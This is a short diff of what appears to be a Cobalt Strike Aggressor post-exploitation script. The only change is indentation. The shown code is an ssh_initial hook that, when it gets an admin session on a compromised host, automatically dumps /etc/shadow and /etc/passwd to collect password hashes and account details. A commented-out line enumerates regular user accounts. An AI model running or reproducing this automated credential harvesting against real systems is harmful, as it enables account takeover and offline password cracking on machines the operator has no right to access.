@@ -433,7 +433,7 @@ on beacon_initial {
 
 on ssh_initial {
    if (-isadmin $1) {
-   		binput($1, "===cat /etc/shadow,/etc/passwd===");
+   	binput($1, "===cat /etc/shadow,/etc/passwd===");
       	bshell($1, "cat /etc/shadow");
       	bshell($1, "cat /etc/passwd");
       	#bshell($1, "for i in $(cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1}'); do id $i; done && (cat /etc/passwd | awk -F : '{if ($3 > 999 && $3 < 60001) print $1,$2,$3,$4,$6,$7}'");
